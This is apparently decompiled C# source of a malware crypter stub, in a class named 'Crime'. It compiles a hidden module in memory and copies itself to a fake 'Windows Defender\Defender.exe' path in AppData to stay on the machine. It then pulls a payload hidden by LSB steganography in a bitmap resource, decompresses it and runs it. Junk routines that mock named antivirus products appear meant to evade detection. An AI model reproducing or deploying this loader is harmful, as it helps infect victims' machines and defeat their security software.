using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using stubPrincipal.My.Resources;

namespace stubPrincipal
{
	// Token: 0x02000012 RID: 18
	[StandardModule]
	internal sealed class Crime
	{
		// Token: 0x06000D38 RID: 3384 RVA: 0x00041488 File Offset: 0x0003F688
		[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
		public static void Main()
		{
			try
			{
				CompilerResults compilerResults = new VBCodeProvider().CompileAssemblyFromSource(new CompilerParameters
				{
					ReferencedAssemblies = 
					{
						"mscorlib.dll",
						"System.Runtime.dll",
						"System.dll",
						"System.Windows.Forms.dll",
						"Microsoft.VisualBasic.dll",
						"System.Linq.dll",
						"System.Core.dll",
						"System.Data.dll",
						"System.Deployment.dll",
						"System.Drawing.dll",
						"System.Xml.dll",
						"System.Xml.Linq.dll",
						"Microsoft.CSharp.dll"
					},
					IncludeDebugInformation = false,
					GenerateExecutable = false,
					GenerateInMemory = true
				}, new string[]
				{
					Crime.EnrrolarAV1()
				});
				Crime.EnrrolarAV2();
				Type type = compilerResults.CompiledAssembly.GetType("Module1");
				Crime.EnrrolarAV1();
				Crime.Install();
				MemoryStream memoryStream = new MemoryStream(Crime.Decode(Resource1.tempbild));
				Crime.EnrrolarAV2();
				type.GetMethod("Starta").Invoke(null, new object[]
				{
					memoryStream.ToArray()
				});
			}
			catch (Exception ex)
			{
			}
			Process.GetCurrentProcess().CloseMainWindow();
			Application.Exit();
			Process.GetCurrentProcess().Close();
			ProjectData.EndApp();
		}

		// Token: 0x06000D39 RID: 3385 RVA: 0x00041648 File Offset: 0x0003F848
		public static object Install()
		{
			if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows Defender"))
			{
				Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows Defender");
			}
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows Defender\\Defender.exe";
			if (!File.Exists(path))
			{
				byte[] bytes = File.ReadAllBytes(Assembly.GetExecutingAssembly().Location);
				File.WriteAllBytes(path, bytes);
			}
			object result;
			return result;
		}

		// Token: 0x06000D3A RID: 3386 RVA: 0x000416B8 File Offset: 0x0003F8B8
		public static string EnrrolarAV1()
		{
			int num = 1;
			checked
			{
				do
				{
					string text = Strings.Replace(Form123.LotarMemoria(), "q", Conversions.ToString(num), 1, -1, CompareMethod.Binary);
					text.Replace("a", "Aqui nem Gabriel Pato Pega");
					text.Replace("a", "O Avast Fica Maluco");
					text.Replace("a", "O Avira nao arruma nada");
					text.Replace("a", "BitDefender Pede pra sair");
					text.Replace("a", "Norton saiu chorando");
					text.Replace("a", "AVG pediu pra sair e tomo tapa na cara");
					if (text.Contains("sera que esse antivirus vai pedir arrego?"))
					{
						break;
					}
					num++;
				}
				while (num <= 30);
				return Resource1.euqueriaumg3.ToString();
			}
		}

		// Token: 0x06000D3B RID: 3387 RVA: 0x00041768 File Offset: 0x0003F968
		public static object EnrrolarAV2()
		{
			object value;
			Strings.Replace(Form123.LotarMemoria(), "n", Conversions.ToString(value), 1, -1, CompareMethod.Binary);
			Strings.Replace(Form123.LotarMemoria(), "o", Conversions.ToString(value), 1, -1, CompareMethod.Binary);
			Strings.Replace(Form123.LotarMemoria(), "p", Conversions.ToString(value), 1, -1, CompareMethod.Binary);
			Strings.Replace(Form123.LotarMemoria(), "q", Conversions.ToString(value), 1, -1, CompareMethod.Binary);
			Strings.Replace(Form123.LotarMemoria(), "a", Conversions.ToString(value), 1, -1, CompareMethod.Binary);
			Strings.Replace(Form123.LotarMemoria(), "b", Conversions.ToString(value), 1, -1, CompareMethod.Binary);
			object result = Strings.Replace(Form123.LotarMemoria(), "c", Conversions.ToString(value), 1, -1, CompareMethod.Binary);
			Strings.Replace(Form123.LotarMemoria(), "f", Conversions.ToString(value), 1, -1, CompareMethod.Binary);
			Strings.Replace(Form123.LotarMemoria(), "g", Conversions.ToString(value), 1, -1, CompareMethod.Binary);
			Strings.Replace(Form123.LotarMemoria(), "h", Conversions.ToString(value), 1, -1, CompareMethod.Binary);
			Strings.Replace(Form123.LotarMemoria(), "i", Conversions.ToString(value), 1, -1, CompareMethod.Binary);
			Strings.Replace(Form123.LotarMemoria(), "j", Conversions.ToString(value), 1, -1, CompareMethod.Binary);
			return result;
		}

		// Token: 0x06000D3C RID: 3388 RVA: 0x000418A0 File Offset: 0x0003FAA0
		public static byte[] Decode(Bitmap BMP)
		{
			if (BMP.PixelFormat != PixelFormat.Format24bppRgb)
			{
				throw new ArgumentException("Invalid bitmap");
			}
			BitmapData bitmapData = new BitmapData();
			BMP.LockBits(new Rectangle(0, 0, BMP.Width, BMP.Height), ImageLockMode.ReadOnly, PixelFormat.Format24bppRgb, bitmapData);
			checked
			{
				byte[] array = new byte[BMP.Height * bitmapData.Stride + 1];
				Marshal.Copy(bitmapData.Scan0, array, 0, array.Length);
				int stride = bitmapData.Stride;
				BMP.UnlockBits(bitmapData);
				byte[] result;
				try
				{
					List<byte> list = new List<byte>();
					byte b = 0;
					int num = 0;
					int num2 = 0;
					int num3 = BMP.Height - 1;
					for (int i = 0; i <= num3; i++)
					{
						int num4 = BMP.Width - 1;
						for (int j = 0; j <= num4; j++)
						{
							int num5 = j * 3 + i * stride;
							int num6 = 1;
							do
							{
								byte b2 = (byte)((array[num5] & 1) << num);
								b |= b2;
								if (num == 7)
								{
									if (num2 != 0 && list.Count == num2)
									{
										goto IL_152;
									}
									list.Add(b);
									if (list.Count == 4 & num2 == 0)
									{
										byte[] value = list.ToArray();
										list.Clear();
										num2 = BitConverter.ToInt32(value, 0);
									}
									b = 0;
									num = 0;
								}
								else
								{
									num++;
								}
								num5++;
								num6++;
							}
							while (num6 <= 3);
						}
					}
					IL_152:
					byte[] bytes;
					using (MemoryStream memoryStream = new MemoryStream(list.ToArray()))
					{
						using (MemoryStream memoryStream2 = new MemoryStream())
						{
							using (DeflateStream deflateStream = new DeflateStream(memoryStream, CompressionMode.Decompress))
							{
								deflateStream.CopyTo(memoryStream2);
							}
							bytes = memoryStream2.ToArray();
						}
					}
					result = Convert.FromBase64String(Encoding.UTF8.GetString(bytes));
				}
				catch (Exception ex)
				{
					throw new ArgumentException("The bitmap passed in the argument \"BMP\" is not a valid LSB encoded bitmap");
				}
				return result;
			}
		}
	}
}
